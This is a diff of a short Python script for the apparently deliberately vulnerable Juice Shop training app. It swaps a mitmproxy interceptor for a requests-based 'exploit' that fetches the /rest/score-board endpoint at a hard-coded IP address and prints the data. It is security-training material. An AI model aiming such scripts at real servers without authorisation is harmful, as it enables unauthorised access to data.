@@ -1,34 +1,25 @@
-import asyncio
-from mitmproxy import http, options
-from mitmproxy.tools.dump import DumpMaster
+import requests
 import json
 
-LISTEN_HOST = "127.0.0.1"
-LISTEN_PORT = 8080
-JUICE_URL_SNIPPET = "45.76.47.218:3000"
-
 class ExposeScoreBoard:
-    def response(self, flow: http.HTTPFlow):
-        try:
-            # Check if the response is for the Score Board API
-            if "/rest/score-board" in flow.request.pretty_url:
-                # Parse and print the JSON response
-                response_content = json.loads(flow.response.text)
-                print("[*] Extracted Score Board Data:")
-                print(json.dumps(response_content, indent=4))
-        except Exception as e:
-            print(f"[!] Error processing score board response: {e}")
+    def __init__(self, base_url):
+        self.base_url = base_url
+        self.session = requests.Session()
+        self.headers = {"Content-Type": "application/json"}
 
-async def run_proxy():
-    opts = options.Options(listen_host=LISTEN_HOST, listen_port=LISTEN_PORT)
-    m = DumpMaster(opts)
-    m.addons.add(ExposeScoreBoard())
-    try:
-        await m.run()
-    except KeyboardInterrupt:
-        print("[!] Proxy interrupted.")
-    finally:
-        m.shutdown()
+    def run_exploit(self):
+        print(f"[+] Fetching /rest/score-board API...")
+        response = self.session.get(f"{self.base_url}/rest/score-board", headers=self.headers)
 
-def expose_score_board():
-    asyncio.run(run_proxy())
+        if response.status_code == 200:
+            score_board_data = response.json()
+            print("[+] Extracted Score Board Data:")
+            print(json.dumps(score_board_data, indent=4))
+        else:
+            print(f"[-] Failed to fetch score board data. Status Code: {response.status_code}")
+
+
+if __name__ == "__main__":
+    url = "http://45.76.47.218:3000"
+    exploit = ExposeScoreBoard(url)
+    exploit.run_exploit()
